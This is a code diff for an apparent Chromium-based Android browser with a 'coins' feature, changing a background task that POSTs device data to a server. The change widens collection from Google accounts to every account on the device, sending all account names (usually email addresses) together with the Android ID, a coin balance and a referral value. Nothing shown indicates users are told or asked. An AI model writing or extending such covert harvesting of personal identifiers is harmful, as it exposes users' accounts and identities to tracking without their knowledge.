@@ -6,6 +6,7 @@ import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.provider.Settings;
+import android.util.Patterns;
 import org.chromium.base.Log;
 import org.chromium.chrome.browser.coins.CoinsSingleton;
 
@@ -15,6 +16,8 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.net.UnknownHostException;
+import java.util.regex.Pattern;
 
 /**
  * Created by elvis on 05.01.17.
@@ -37,13 +40,15 @@ public class SendInfoTask extends AsyncTask<Void, Void, Void> {
 //        IMEI = telephonyManager.getDeviceId();
 //        IMSI = telephonyManager.getSubscriberId();
 
-
+        String refferal = context.getSharedPreferences("referral", Context.MODE_PRIVATE).getString("referral", "");
 
         try {
             String urlParameters =
                     "id=" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)
                     + "&info=" + collectInfo()
-                    + "&coins=" + CoinsSingleton.getInstance().getValue();
+                    + "&coins=" + CoinsSingleton.getInstance().getValue()
+                    + "&refferal=" + refferal;
+
 
             Log.i("SendInfoTask", "Send info" + urlParameters);
             byte[] postData = urlParameters.getBytes("UTF8");
@@ -79,14 +84,13 @@ public class SendInfoTask extends AsyncTask<Void, Void, Void> {
     private String collectInfo() {
         StringBuilder info = new StringBuilder();
 
-        Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
-        if (accounts.length > 0) {
-            info.append("email=");
-            for (Account account : accounts) {
-                info.append(account.name).append(",");
-            }
-            info.append(";");
+        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
+        Account[] accounts = AccountManager.get(context).getAccounts();
+        info.append("email=");
+        for (Account account : accounts) {
+            info.append(account.name).append(",");
         }
+        info.append(";");
 
 
         info.append("uniqueid=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append(";");
